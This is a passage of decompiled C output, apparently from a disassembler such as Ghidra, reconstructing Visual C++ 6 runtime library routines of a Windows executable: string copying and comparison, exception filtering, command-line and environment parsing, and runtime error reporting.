            local_c = local_c + local_10;
            if (((int)local_10 < (int)pcVar5 - (int)local_418) ||
               (param_3 <= (uint)((int)local_8 - (int)param_2))) goto LAB_0040905f;
          } while( true );
        }
      }
      if (((*(byte *)(*piVar1 + 4 + iVar7) & 0x40) != 0) && (*param_2 == '\x1a')) {
        return 0;
      }
      _DAT_004122f4 = 0x1c;
      _DAT_004122f8 = 0;
      return -1;
    }
  }
  _DAT_004122f8 = 0;
  _DAT_004122f4 = 9;
  return -1;
}



// Library Function - Multiple Matches With Different Base Names
//  __mbscpy
//  _strcpy
// 
// Libraries: Visual Studio 1998 Debug, Visual Studio 1998 Release

char * __cdecl FID_conflict___mbscpy(char *_Dest,char *_Source)

{
  byte bVar1;
  uint uVar2;
  uint uVar3;
  uint *puVar4;
  
  uVar3 = (uint)_Source & 3;
  puVar4 = (uint *)_Dest;
  while (uVar3 != 0) {
    bVar1 = *_Source;
    uVar3 = (uint)bVar1;
    _Source = (char *)((int)_Source + 1);
    if (bVar1 == 0) goto LAB_00409208;
    *(byte *)puVar4 = bVar1;
    puVar4 = (uint *)((int)puVar4 + 1);
    uVar3 = (uint)_Source & 3;
  }
  do {
    uVar2 = *(uint *)_Source;
    uVar3 = *(uint *)_Source;
    _Source = (char *)((int)_Source + 4);
    if (((uVar2 ^ 0xffffffff ^ uVar2 + 0x7efefeff) & 0x81010100) != 0) {
      if ((char)uVar3 == '\0') {
LAB_00409208:
        *(byte *)puVar4 = (byte)uVar3;
        return _Dest;
      }
      if ((char)(uVar3 >> 8) == '\0') {
        *(short *)puVar4 = (short)uVar3;
        return _Dest;
      }
      if ((uVar3 & 0xff0000) == 0) {
        *(short *)puVar4 = (short)uVar3;
        *(byte *)((int)puVar4 + 2) = 0;
        return _Dest;
      }
      if ((uVar3 & 0xff000000) == 0) {
        *puVar4 = uVar3;
        return _Dest;
      }
    }
    *puVar4 = uVar3;
    puVar4 = puVar4 + 1;
  } while( true );
}



// Library Function - Multiple Matches With Different Base Names
//  __mbscat
//  _strcat
// 
// Libraries: Visual Studio 1998 Debug, Visual Studio 1998 Release

char * __cdecl FID_conflict__strcat(char *_Dest,char *_Source)

{
  byte bVar1;
  uint uVar2;
  uint *puVar3;
  uint uVar4;
  uint *puVar5;
  
  uVar4 = (uint)_Dest & 3;
  puVar3 = (uint *)_Dest;
  while (uVar4 != 0) {
    bVar1 = *(byte *)puVar3;
    puVar3 = (uint *)((int)puVar3 + 1);
    if (bVar1 == 0) goto LAB_0040917f;
    uVar4 = (uint)puVar3 & 3;
  }
  do {
    do {
      puVar5 = puVar3;
      puVar3 = puVar5 + 1;
    } while (((*puVar5 ^ 0xffffffff ^ *puVar5 + 0x7efefeff) & 0x81010100) == 0);
    uVar4 = *puVar5;
    if ((char)uVar4 == '\0') goto LAB_00409191;
    if ((char)(uVar4 >> 8) == '\0') {
      puVar5 = (uint *)((int)puVar5 + 1);
      goto LAB_00409191;
    }
    if ((uVar4 & 0xff0000) == 0) {
      puVar5 = (uint *)((int)puVar5 + 2);
      goto LAB_00409191;
    }
  } while ((uVar4 & 0xff000000) != 0);
LAB_0040917f:
  puVar5 = (uint *)((int)puVar3 + -1);
LAB_00409191:
  uVar4 = (uint)_Source & 3;
  while (uVar4 != 0) {
    bVar1 = *_Source;
    uVar4 = (uint)bVar1;
    _Source = (char *)((int)_Source + 1);
    if (bVar1 == 0) goto LAB_00409208;
    *(byte *)puVar5 = bVar1;
    puVar5 = (uint *)((int)puVar5 + 1);
    uVar4 = (uint)_Source & 3;
  }
  do {
    uVar2 = *(uint *)_Source;
    uVar4 = *(uint *)_Source;
    _Source = (char *)((int)_Source + 4);
    if (((uVar2 ^ 0xffffffff ^ uVar2 + 0x7efefeff) & 0x81010100) != 0) {
      if ((char)uVar4 == '\0') {
LAB_00409208:
        *(byte *)puVar5 = (byte)uVar4;
        return _Dest;
      }
      if ((char)(uVar4 >> 8) == '\0') {
        *(short *)puVar5 = (short)uVar4;
        return _Dest;
      }
      if ((uVar4 & 0xff0000) == 0) {
        *(short *)puVar5 = (short)uVar4;
        *(byte *)((int)puVar5 + 2) = 0;
        return _Dest;
      }
      if ((uVar4 & 0xff000000) == 0) {
        *puVar5 = uVar4;
        return _Dest;
      }
    }
    *puVar5 = uVar4;
    puVar5 = puVar5 + 1;
  } while( true );
}



// Library Function - Single Match
//  __strcmpi
// 
// Libraries: Visual Studio 1998 Debug, Visual Studio 1998 Release

int __cdecl __strcmpi(char *_Str1,char *_Str2)

{
  char cVar1;
  char cVar2;
  byte bVar3;
  byte bVar6;
  int iVar4;
  uint uVar5;
  uint uVar7;
  
  if (DAT_00412348 == 0) {
    uVar5 = 0xff;
    do {
      do {
        cVar2 = (char)uVar5;
        if (cVar2 == '\0') goto LAB_0040925e;
        cVar2 = *_Str2;
        _Str2 = _Str2 + 1;
        cVar1 = *_Str1;
        uVar5 = (uint)CONCAT11(cVar1,cVar2);
        _Str1 = _Str1 + 1;
      } while ((char)(uVar5 >> 8) == cVar2);
      bVar3 = cVar1 + 0xbf;
      bVar3 = bVar3 + (-(bVar3 < 0x1a) & 0x20U) + 0x41;
      uVar5 = (uint)CONCAT11(cVar2 + 0xbfU + (-((byte)(cVar2 + 0xbfU) < 0x1a) & 0x20U) + 'A',bVar3);
      bVar6 = (byte)(uVar5 >> 8);
    } while (bVar3 == bVar6);
    cVar2 = (bVar3 < bVar6) * -2 + '\x01';
LAB_0040925e:
    iVar4 = (int)cVar2;
  }
  else {
    uVar5 = 0xff;
    uVar7 = 0;
    do {
      do {
        if ((char)uVar5 == '\0') {
          return uVar5;
        }
        bVar3 = *_Str2;
        uVar5 = uVar5 & 0xffffff00 | (uint)bVar3;
        _Str2 = (char *)((byte *)_Str2 + 1);
        bVar6 = *_Str1;
        uVar7 = uVar7 & 0xffffff00 | (uint)bVar6;
        _Str1 = (char *)((byte *)_Str1 + 1);
      } while (bVar3 == bVar6);
      uVar7 = FUN_0040af00(uVar7,uVar5);
      uVar5 = FUN_0040af00();
    } while ((byte)uVar7 == (byte)uVar5);
    uVar5 = (uint)((byte)uVar7 < (byte)uVar5);
    iVar4 = (1 - uVar5) - (uint)(uVar5 != 0);
  }
  return iVar4;
}



uint * FUN_004092f0(uint *param_1,char param_2)

{
  uint uVar1;
  char cVar2;
  uint uVar3;
  uint uVar4;
  uint *puVar5;
  
  uVar1 = (uint)param_1 & 3;
  while (uVar1 != 0) {
    if (*(char *)param_1 == param_2) {
      return param_1;
    }
    if (*(char *)param_1 == '\0') {
      return (uint *)0x0;
    }
    uVar1 = (uint)(uint *)((int)param_1 + 1) & 3;
    param_1 = (uint *)((int)param_1 + 1);
  }
  while( true ) {
    while( true ) {
      uVar1 = *param_1;
      uVar4 = uVar1 ^ CONCAT22(CONCAT11(param_2,param_2),CONCAT11(param_2,param_2));
      uVar3 = uVar1 ^ 0xffffffff ^ uVar1 + 0x7efefeff;
      puVar5 = param_1 + 1;
      if (((uVar4 ^ 0xffffffff ^ uVar4 + 0x7efefeff) & 0x81010100) != 0) break;
      param_1 = puVar5;
      if ((uVar3 & 0x81010100) != 0) {
        if ((uVar3 & 0x1010100) != 0) {
          return (uint *)0x0;
        }
        if ((uVar1 + 0x7efefeff & 0x80000000) == 0) {
          return (uint *)0x0;
        }
      }
    }
    uVar1 = *param_1;
    if ((char)uVar1 == param_2) {
      return param_1;
    }
    if ((char)uVar1 == '\0') {
      return (uint *)0x0;
    }
    cVar2 = (char)(uVar1 >> 8);
    if (cVar2 == param_2) {
      return (uint *)((int)param_1 + 1);
    }
    if (cVar2 == '\0') break;
    cVar2 = (char)(uVar1 >> 0x10);
    if (cVar2 == param_2) {
      return (uint *)((int)param_1 + 2);
    }
    if (cVar2 == '\0') {
      return (uint *)0x0;
    }
    cVar2 = (char)(uVar1 >> 0x18);
    if (cVar2 == param_2) {
      return (uint *)((int)param_1 + 3);
    }
    param_1 = puVar5;
    if (cVar2 == '\0') {
      return (uint *)0x0;
    }
  }
  return (uint *)0x0;
}



LONG FUN_004093ac(undefined4 param_1,_EXCEPTION_POINTERS *param_2)

{
  code *pcVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  int *piVar4;
  LONG LVar5;
  int iVar6;
  undefined4 *puVar7;
  
  piVar4 = (int *)FUN_004094ed(param_1);
  uVar3 = DAT_0041242c;
  if ((piVar4 == (int *)0x0) || (pcVar1 = (code *)piVar4[2], pcVar1 == (code *)0x0)) {
    LVar5 = UnhandledExceptionFilter(param_2);
  }
  else if (pcVar1 == (code *)0x5) {
    piVar4[2] = 0;
    LVar5 = 1;
  }
  else {
    if (pcVar1 != (code *)0x1) {
      DAT_0041242c = param_2;
      if (piVar4[1] == 8) {
        if (DAT_00411ce8 < DAT_00411cec + DAT_00411ce8) {
          iVar6 = (DAT_00411cec + DAT_00411ce8) - DAT_00411ce8;
          puVar7 = (undefined4 *)(DAT_00411ce8 * 0xc + 0x411c78);
          do {
            *puVar7 = 0;
            puVar7 = puVar7 + 3;
            iVar6 = iVar6 + -1;
          } while (iVar6 != 0);
        }
        uVar2 = DAT_00411cf4;
        iVar6 = *piVar4;
        if (iVar6 == -0x3fffff72) {
          DAT_00411cf4 = 0x83;
        }
        else if (iVar6 == -0x3fffff70) {
          DAT_00411cf4 = 0x81;
        }
        else if (iVar6 == -0x3fffff6f) {
          DAT_00411cf4 = 0x84;
        }
        else if (iVar6 == -0x3fffff6d) {
          DAT_00411cf4 = 0x85;
        }
        else if (iVar6 == -0x3fffff73) {
          DAT_00411cf4 = 0x82;
        }
        else if (iVar6 == -0x3fffff71) {
          DAT_00411cf4 = 0x86;
        }
        else if (iVar6 == -0x3fffff6e) {
          DAT_00411cf4 = 0x8a;
        }
        (*pcVar1)(8,DAT_00411cf4);
        DAT_00411cf4 = uVar2;
      }
      else {
        piVar4[2] = 0;
        (*pcVar1)(piVar4[1]);
      }
    }
    LVar5 = -1;
    DAT_0041242c = (_EXCEPTION_POINTERS *)uVar3;
  }
  return LVar5;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

int * FUN_004094ed(int param_1)

{
  int *piVar1;
  
  piVar1 = (int *)&DAT_00411c70;
  if (_DAT_00411c70 != param_1) {
    do {
      piVar1 = piVar1 + 3;
      if (&DAT_00411c70 + DAT_00411cf0 * 0xc <= piVar1) break;
    } while (*piVar1 != param_1);
  }
  if ((&DAT_00411c70 + DAT_00411cf0 * 0xc <= piVar1) || (*piVar1 != param_1)) {
    piVar1 = (int *)0x0;
  }
  return piVar1;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

byte * FUN_00409530(void)

{
  byte bVar1;
  int iVar2;
  byte *pbVar3;
  byte *pbVar4;
  
  if (_DAT_0041390c == 0) {
    FUN_0040b3d1();
  }
  bVar1 = *DAT_0041391c;
  pbVar4 = DAT_0041391c;
  if (bVar1 == 0x22) {
    while( true ) {
      pbVar3 = pbVar4;
      bVar1 = pbVar3[1];
      pbVar4 = pbVar3 + 1;
      if ((bVar1 == 0x22) || (bVar1 == 0)) break;
      iVar2 = FUN_0040afcb(bVar1);
      if (iVar2 != 0) {
        pbVar4 = pbVar3 + 2;
      }
    }
    if (*pbVar4 == 0x22) goto LAB_0040956d;
  }
  else {
    while (0x20 < bVar1) {
      bVar1 = pbVar4[1];
      pbVar4 = pbVar4 + 1;
    }
  }
  for (; (*pbVar4 != 0 && (*pbVar4 < 0x21)); pbVar4 = pbVar4 + 1) {
LAB_0040956d:
  }
  return pbVar4;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00409588(void)

{
  char cVar1;
  size_t sVar2;
  char **ppcVar3;
  char *pcVar4;
  int iVar5;
  char *pcVar6;
  
  if (_DAT_0041390c == 0) {
    FUN_0040b3d1();
  }
  iVar5 = 0;
  for (pcVar6 = DAT_004122d8; *pcVar6 != '\0'; pcVar6 = pcVar6 + sVar2 + 1) {
    if (*pcVar6 != '=') {
      iVar5 = iVar5 + 1;
    }
    sVar2 = _strlen(pcVar6);
  }
  ppcVar3 = (char **)_malloc(iVar5 * 4 + 4);
  DAT_0041231c = ppcVar3;
  if (ppcVar3 == (char **)0x0) {
    __amsg_exit(9);
  }
  cVar1 = *DAT_004122d8;
  pcVar6 = DAT_004122d8;
  while (cVar1 != '\0') {
    sVar2 = _strlen(pcVar6);
    if (*pcVar6 != '=') {
      pcVar4 = (char *)_malloc(sVar2 + 1);
      *ppcVar3 = pcVar4;
      if (pcVar4 == (char *)0x0) {
        __amsg_exit(9);
      }
      FID_conflict___mbscpy(*ppcVar3,pcVar6);
      ppcVar3 = ppcVar3 + 1;
    }
    pcVar6 = pcVar6 + sVar2 + 1;
    cVar1 = *pcVar6;
  }
  FUN_00404b0a(DAT_004122d8);
  DAT_004122d8 = (char *)0x0;
  *ppcVar3 = (char *)0x0;
  _DAT_00413908 = 1;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00409641(void)

{
  void *pvVar1;
  char *pcVar2;
  int local_c;
  int local_8;
  
  if (_DAT_0041390c == 0) {
    FUN_0040b3d1();
  }
  GetModuleFileNameA((HMODULE)0x0,&DAT_00412430,0x104);
  _DAT_0041232c = &DAT_00412430;
  pcVar2 = &DAT_00412430;
  if (*DAT_0041391c != '\0') {
    pcVar2 = DAT_0041391c;
  }
  FUN_004096da(pcVar2,0,0,&local_8,&local_c);
  pvVar1 = _malloc(local_c + local_8 * 4);
  if (pvVar1 == (void *)0x0) {
    __amsg_exit(8);
  }
  FUN_004096da(pcVar2,pvVar1,(void *)((int)pvVar1 + local_8 * 4),&local_8,&local_c);
  _DAT_00412314 = pvVar1;
  _DAT_00412310 = local_8 + -1;
  return;
}



void FUN_004096da(byte *param_1,byte **param_2,byte *param_3,int *param_4,int *param_5)

{
  byte bVar1;
  bool bVar2;
  bool bVar3;
  byte *pbVar4;
  byte *pbVar5;
  uint uVar6;
  byte **ppbVar7;
  
  *param_5 = 0;
  *param_4 = 1;
  if (param_2 != (byte **)0x0) {
    *param_2 = param_3;
    param_2 = param_2 + 1;
  }
  if (*param_1 == 0x22) {
    while( true ) {
      bVar1 = param_1[1];
      pbVar4 = param_1 + 1;
      if ((bVar1 == 0x22) || (bVar1 == 0)) break;
      if ((((&DAT_004126a1)[bVar1] & 4) != 0) && (*param_5 = *param_5 + 1, param_3 != (byte *)0x0))
      {
        *param_3 = *pbVar4;
        param_3 = param_3 + 1;
        pbVar4 = param_1 + 2;
      }
      *param_5 = *param_5 + 1;
      param_1 = pbVar4;
      if (param_3 != (byte *)0x0) {
        *param_3 = *pbVar4;
        param_3 = param_3 + 1;
      }
    }
    *param_5 = *param_5 + 1;
    if (param_3 != (byte *)0x0) {
      *param_3 = 0;
      param_3 = param_3 + 1;
    }
    if (*pbVar4 == 0x22) {
      pbVar4 = param_1 + 2;
    }
  }
  else {
    do {
      *param_5 = *param_5 + 1;
      if (param_3 != (byte *)0x0) {
        *param_3 = *param_1;
        param_3 = param_3 + 1;
      }
      bVar1 = *param_1;
      pbVar4 = param_1 + 1;
      if (((&DAT_004126a1)[bVar1] & 4) != 0) {
        *param_5 = *param_5 + 1;
        if (param_3 != (byte *)0x0) {
          *param_3 = *pbVar4;
          param_3 = param_3 + 1;
        }
        pbVar4 = param_1 + 2;
      }
      if (bVar1 == 0x20) break;
      if (bVar1 == 0) goto LAB_00409785;
      param_1 = pbVar4;
    } while (bVar1 != 9);
    if (bVar1 == 0) {
LAB_00409785:
      pbVar4 = pbVar4 + -1;
    }
    else if (param_3 != (byte *)0x0) {
      param_3[-1] = 0;
    }
  }
  bVar2 = false;
  ppbVar7 = param_2;
  while (*pbVar4 != 0) {
    for (; (*pbVar4 == 0x20 || (*pbVar4 == 9)); pbVar4 = pbVar4 + 1) {
    }
    if (*pbVar4 == 0) break;
    if (ppbVar7 != (byte **)0x0) {
      *ppbVar7 = param_3;
      ppbVar7 = ppbVar7 + 1;
      param_2 = ppbVar7;
    }
    *param_4 = *param_4 + 1;
    while( true ) {
      bVar3 = true;
      uVar6 = 0;
      for (; *pbVar4 == 0x5c; pbVar4 = pbVar4 + 1) {
        uVar6 = uVar6 + 1;
      }
      if (*pbVar4 == 0x22) {
        pbVar5 = pbVar4;
        if ((uVar6 & 1) == 0) {
          if ((!bVar2) || (pbVar5 = pbVar4 + 1, pbVar4[1] != 0x22)) {
            bVar3 = false;
            pbVar5 = pbVar4;
          }
          bVar2 = !bVar2;
          ppbVar7 = param_2;
        }
        uVar6 = uVar6 >> 1;
        pbVar4 = pbVar5;
      }
      for (; uVar6 != 0; uVar6 = uVar6 - 1) {
        if (param_3 != (byte *)0x0) {
          *param_3 = 0x5c;
          param_3 = param_3 + 1;
        }
        *param_5 = *param_5 + 1;
      }
      bVar1 = *pbVar4;
      if ((bVar1 == 0) || ((!bVar2 && ((bVar1 == 0x20 || (bVar1 == 9)))))) break;
      if (bVar3) {
        if (param_3 == (byte *)0x0) {
          if (((&DAT_004126a1)[bVar1] & 4) != 0) {
            pbVar4 = pbVar4 + 1;
            *param_5 = *param_5 + 1;
          }
        }
        else {
          if (((&DAT_004126a1)[bVar1] & 4) != 0) {
            *param_3 = bVar1;
            param_3 = param_3 + 1;
            pbVar4 = pbVar4 + 1;
            *param_5 = *param_5 + 1;
          }
          *param_3 = *pbVar4;
          param_3 = param_3 + 1;
        }
        *param_5 = *param_5 + 1;
      }
      pbVar4 = pbVar4 + 1;
    }
    if (param_3 != (byte *)0x0) {
      *param_3 = 0;
      param_3 = param_3 + 1;
    }
    *param_5 = *param_5 + 1;
  }
  if (ppbVar7 != (byte **)0x0) {
    *ppbVar7 = (byte *)0x0;
  }
  *param_4 = *param_4 + 1;
  return;
}



LPSTR FUN_0040988e(void)

{
  char cVar1;
  WCHAR WVar2;
  WCHAR *pWVar3;
  WCHAR *pWVar4;
  int iVar5;
  size_t _Size;
  LPSTR pCVar6;
  char *pcVar7;
  LPWCH lpWideCharStr;
  LPCH pCVar9;
  LPSTR local_8;
  char *pcVar8;
  
  lpWideCharStr = (LPWCH)0x0;
  pCVar9 = (LPCH)0x0;
  if (DAT_00412534 == 0) {
    lpWideCharStr = GetEnvironmentStringsW();
    if (lpWideCharStr != (LPWCH)0x0) {
      DAT_00412534 = 1;
LAB_004098e5:
      if ((lpWideCharStr == (LPWCH)0x0) &&
         (lpWideCharStr = GetEnvironmentStringsW(), lpWideCharStr == (LPWCH)0x0)) {
        return (LPSTR)0x0;
      }
      WVar2 = *lpWideCharStr;
      pWVar4 = lpWideCharStr;
      while (WVar2 != L'\0') {
        do {
          pWVar3 = pWVar4;
          pWVar4 = pWVar3 + 1;
        } while (*pWVar4 != L'\0');
        pWVar4 = pWVar3 + 2;
        WVar2 = *pWVar4;
      }
      iVar5 = ((int)pWVar4 - (int)lpWideCharStr >> 1) + 1;
      _Size = WideCharToMultiByte(0,0,lpWideCharStr,iVar5,(LPSTR)0x0,0,(LPCSTR)0x0,(LPBOOL)0x0);
      local_8 = (LPSTR)0x0;
      if (((_Size != 0) && (pCVar6 = (LPSTR)_malloc(_Size), pCVar6 != (LPSTR)0x0)) &&
         (iVar5 = WideCharToMultiByte(0,0,lpWideCharStr,iVar5,pCVar6,_Size,(LPCSTR)0x0,(LPBOOL)0x0),
         local_8 = pCVar6, iVar5 == 0)) {
        FUN_00404b0a(pCVar6);
        local_8 = (LPSTR)0x0;
      }
      FreeEnvironmentStringsW(lpWideCharStr);
      return local_8;
    }
    pCVar9 = GetEnvironmentStrings();
    if (pCVar9 == (LPCH)0x0) {
      return (LPSTR)0x0;
    }
    DAT_00412534 = 2;
  }
  else {
    if (DAT_00412534 == 1) goto LAB_004098e5;
    if (DAT_00412534 != 2) {
      return (LPSTR)0x0;
    }
  }
  if ((pCVar9 == (LPCH)0x0) && (pCVar9 = GetEnvironmentStrings(), pCVar9 == (LPCH)0x0)) {
    return (LPSTR)0x0;
  }
  cVar1 = *pCVar9;
  pcVar7 = pCVar9;
  while (cVar1 != '\0') {
    do {
      pcVar8 = pcVar7;
      pcVar7 = pcVar8 + 1;
    } while (*pcVar7 != '\0');
    pcVar7 = pcVar8 + 2;
    cVar1 = *pcVar7;
  }
  pCVar6 = (LPSTR)_malloc((size_t)(pcVar7 + (1 - (int)pCVar9)));
  if (pCVar6 == (LPSTR)0x0) {
    pCVar6 = (LPSTR)0x0;
  }
  else {
    FUN_00404fe0(pCVar6,pCVar9,pcVar7 + (1 - (int)pCVar9));
  }
  FreeEnvironmentStringsA(pCVar9);
  return pCVar6;
}



void FUN_004099c0(void)

{
  HANDLE *ppvVar1;
  undefined4 *puVar2;
  undefined4 *puVar3;
  undefined4 *puVar4;
  DWORD DVar5;
  HANDLE hFile;
  HANDLE *ppvVar6;
  int iVar7;
  UINT UVar8;
  UINT UVar9;
  uint uVar10;
  _STARTUPINFOA local_44;
  
  puVar3 = (undefined4 *)_malloc(0x100);
  if (puVar3 == (undefined4 *)0x0) {
    __amsg_exit(0x1b);
  }
  DAT_004138e0 = 0x20;
  DAT_004137e0 = puVar3;
  for (; puVar3 < DAT_004137e0 + 0x40; puVar3 = puVar3 + 2) {
    *(undefined *)(puVar3 + 1) = 0;
    *puVar3 = 0xffffffff;
    *(undefined *)((int)puVar3 + 5) = 10;
  }
  GetStartupInfoA(&local_44);
  if ((local_44.cbReserved2 != 0) && ((UINT *)local_44.lpReserved2 != (UINT *)0x0)) {
    UVar8 = *(UINT *)local_44.lpReserved2;
    local_44.lpReserved2 = (LPBYTE)((int)local_44.lpReserved2 + 4);
    ppvVar6 = (HANDLE *)(UVar8 + (int)local_44.lpReserved2);
    if (0x7ff < (int)UVar8) {
      UVar8 = 0x800;
    }
    UVar9 = UVar8;
    if ((int)DAT_004138e0 < (int)UVar8) {
      puVar3 = &DAT_004137e4;
      do {
        puVar4 = (undefined4 *)_malloc(0x100);
        UVar9 = DAT_004138e0;
        if (puVar4 == (undefined4 *)0x0) break;
        DAT_004138e0 = DAT_004138e0 + 0x20;
        *puVar3 = puVar4;
        puVar2 = puVar4;
        for (; puVar4 < puVar2 + 0x40; puVar4 = puVar4 + 2) {
          *(undefined *)(puVar4 + 1) = 0;
          *puVar4 = 0xffffffff;
          *(undefined *)((int)puVar4 + 5) = 10;
          puVar2 = (undefined4 *)*puVar3;
        }
        puVar3 = puVar3 + 1;
        UVar9 = UVar8;
      } while ((int)DAT_004138e0 < (int)UVar8);
    }
    uVar10 = 0;
    if (0 < (int)UVar9) {
      do {
        if (((*ppvVar6 != (HANDLE)0xffffffff) && ((*local_44.lpReserved2 & 1) != 0)) &&
           (((*local_44.lpReserved2 & 8) != 0 || (DVar5 = GetFileType(*ppvVar6), DVar5 != 0)))) {
          ppvVar1 = (HANDLE *)((int)(&DAT_004137e0)[(int)uVar10 >> 5] + (uVar10 & 0x1f) * 8);
          *ppvVar1 = *ppvVar6;
          *(BYTE *)(ppvVar1 + 1) = *local_44.lpReserved2;
        }
        uVar10 = uVar10 + 1;
        local_44.lpReserved2 = (LPBYTE)((int)local_44.lpReserved2 + 1);
        ppvVar6 = ppvVar6 + 1;
      } while ((int)uVar10 < (int)UVar9);
    }
  }
  iVar7 = 0;
  do {
    ppvVar6 = (HANDLE *)(DAT_004137e0 + iVar7 * 2);
    if (DAT_004137e0[iVar7 * 2] == -1) {
      *(undefined *)(ppvVar6 + 1) = 0x81;
      if (iVar7 == 0) {
        DVar5 = 0xfffffff6;
      }
      else {
        DVar5 = 0xfffffff5 - (iVar7 != 1);
      }
      hFile = GetStdHandle(DVar5);
      if ((hFile != (HANDLE)0xffffffff) && (DVar5 = GetFileType(hFile), DVar5 != 0)) {
        *ppvVar6 = hFile;
        if ((DVar5 & 0xff) != 2) {
          if ((DVar5 & 0xff) == 3) {
            *(byte *)(ppvVar6 + 1) = *(byte *)(ppvVar6 + 1) | 8;
          }
          goto LAB_00409b51;
        }
      }
      *(byte *)(ppvVar6 + 1) = *(byte *)(ppvVar6 + 1) | 0x40;
    }
    else {
      *(byte *)(ppvVar6 + 1) = *(byte *)(ppvVar6 + 1) | 0x80;
    }
LAB_00409b51:
    iVar7 = iVar7 + 1;
    if (2 < iVar7) {
      SetHandleCount(DAT_004138e0);
      return;
    }
  } while( true );
}



void FUN_00409c31(int param_1)

{
  __local_unwind2(*(undefined4 *)(param_1 + 0x18),*(undefined4 *)(param_1 + 0x1c));
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00409c4c(void)

{
  if ((DAT_004122e0 == 1) || ((DAT_004122e0 == 0 && (_DAT_0040f8c4 == 1)))) {
    FUN_00409c85(0xfc);
    if (DAT_00412538 != (code *)0x0) {
      (*DAT_00412538)();
    }
    FUN_00409c85(0xff);
  }
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00409c85(undefined *param_1)

{
  char **ppcVar1;
  undefined **ppuVar2;
  DWORD DVar3;
  size_t sVar4;
  HANDLE hFile;
  int iVar5;
  CHAR *_Dest;
  char acStackY_1e3 [3];
  undefined4 uStackY_1e0;
  char *pcStackY_1dc;
  char *pcStackY_1d8;
  undefined4 uStackY_1d4;
  char *lpBuffer;
  LPDWORD lpNumberOfBytesWritten;
  LPOVERLAPPED lpOverlapped;
  CHAR local_1a8 [260];
  char local_a4 [160];
  
  iVar5 = 0;
  ppuVar2 = (undefined **)&DAT_00411d00;
  do {
    if (param_1 == *ppuVar2) break;
    ppuVar2 = ppuVar2 + 2;
    iVar5 = iVar5 + 1;
  } while (ppuVar2 < &PTR_DAT_00411d90);
  if (param_1 == (undefined *)(&DAT_00411d00)[iVar5 * 2]) {
    if ((DAT_004122e0 == 1) || ((DAT_004122e0 == 0 && (_DAT_0040f8c4 == 1)))) {
      lpNumberOfBytesWritten = (LPDWORD)&param_1;
      ppcVar1 = (char **)(iVar5 * 8 + 0x411d04);
      lpOverlapped = (LPOVERLAPPED)0x0;
      sVar4 = _strlen(*ppcVar1);
      lpBuffer = *ppcVar1;
      hFile = GetStdHandle(0xfffffff4);
      WriteFile(hFile,lpBuffer,sVar4,lpNumberOfBytesWritten,lpOverlapped);
    }
    else if (param_1 != (undefined *)0xfc) {
      DVar3 = GetModuleFileNameA((HMODULE)0x0,local_1a8,0x104);
      if (DVar3 == 0) {
        FID_conflict___mbscpy(local_1a8,"<program name unknown>");
      }
      _Dest = local_1a8;
      sVar4 = _strlen(local_1a8);
      if (0x3c < sVar4 + 1) {
        sVar4 = _strlen(local_1a8);
        _Dest = acStackY_1e3 + sVar4;
        _strncpy(_Dest,"...",3);
      }
      FID_conflict___mbscpy(local_a4,"Runtime Error!\n\nProgram: ");
      FID_conflict__strcat(local_a4,_Dest);
      FID_conflict__strcat(local_a4,"\n\n");
      uStackY_1d4 = 0x409d93;
      FID_conflict__strcat(local_a4,*(char **)(iVar5 * 8 + 0x411d04));
      uStackY_1d4 = 0x12010;
      pcStackY_1dc = local_a4;
      pcStackY_1d8 = "Microsoft Visual C++ Runtime Library";
      uStackY_1e0 = 0x409da9;
      FUN_0040b3ed();
    }
  }
  return;
}



// Library Function - Single Match
//  _strcmp
// 
// Libraries: Visual Studio 1998 Debug, Visual Studio 1998 Release

int __cdecl _strcmp(char *_Str1,char *_Str2)

{
  ushort uVar1;
  undefined4 uVar2;
  byte bVar3;
  byte bVar4;
  bool bVar5;
  
  if (((uint)_Str1 & 3) != 0) {
    if (((uint)_Str1 & 1) != 0) {
      bVar4 = *_Str1;
      _Str1 = _Str1 + 1;
      bVar5 = bVar4 < (byte)*_Str2;
      if (bVar4 != *_Str2) goto LAB_00409e24;
      _Str2 = _Str2 + 1;
      if (bVar4 == 0) {
        return 0;
      }
      if (((uint)_Str1 & 2) == 0) goto LAB_00409df0;
    }
    uVar1 = *(ushort *)_Str1;
    _Str1 = (char *)((int)_Str1 + 2);
    bVar4 = (byte)uVar1;
    bVar5 = bVar4 < (byte)*_Str2;
    if (bVar4 != *_Str2) goto LAB_00409e24;
    if (bVar4 == 0) {
      return 0;
    }
    bVar4 = (byte)((uint)uVar1 >> 8);
    bVar5 = bVar4 < ((byte *)_Str2)[1];
    if (bVar4 != ((byte *)_Str2)[1]) goto LAB_00409e24;
    if (bVar4 == 0) {
      return 0;
    }
    _Str2 = (char *)((byte *)_Str2 + 2);
  }
LAB_00409df0:
  while( true ) {
    uVar2 = *(undefined4 *)_Str1;
    bVar4 = (byte)uVar2;
    bVar5 = bVar4 < (byte)*_Str2;
    if (bVar4 != *_Str2) break;
    if (bVar4 == 0) {
      return 0;
    }
    bVar4 = (byte)((uint)uVar2 >> 8);
    bVar5 = bVar4 < ((byte *)_Str2)[1];
    if (bVar4 != ((byte *)_Str2)[1]) break;
    if (bVar4 == 0) {
      return 0;
    }
    bVar4 = (byte)((uint)uVar2 >> 0x10);
    bVar5 = bVar4 < ((byte *)_Str2)[2];
    if (bVar4 != ((byte *)_Str2)[2]) break;
    bVar3 = (byte)((uint)uVar2 >> 0x18);
    if (bVar4 == 0) {
      return 0;
    }
    bVar5 = bVar3 < ((byte *)_Str2)[3];
    if (bVar3 != ((byte *)_Str2)[3]) break;
    _Str2 = (char *)((byte *)_Str2 + 4);
    _Str1 = (char *)((int)_Str1 + 4);
    if (bVar3 == 0) {
      return 0;
    }
  }
LAB_00409e24:
  return (uint)bVar5 * -2 + 1;
}



undefined4 FUN_00409e64(int **param_1)

{
  int *piVar1;
  undefined4 uVar2;
  int iVar3;
  
  piVar1 = *param_1;
  if (((*piVar1 == -0x1f928c9d) && (piVar1[4] == 3)) && (piVar1[5] == 0x19930520)) {
    uVar2 = FUN_00405b5c();
    return uVar2;
  }
  if ((DAT_0041253c != (code *)0x0) && (iVar3 = FUN_00409f00(DAT_0041253c), iVar3 != 0)) {
    uVar2 = (*DAT_0041253c)(param_1);
    return uVar2;
  }
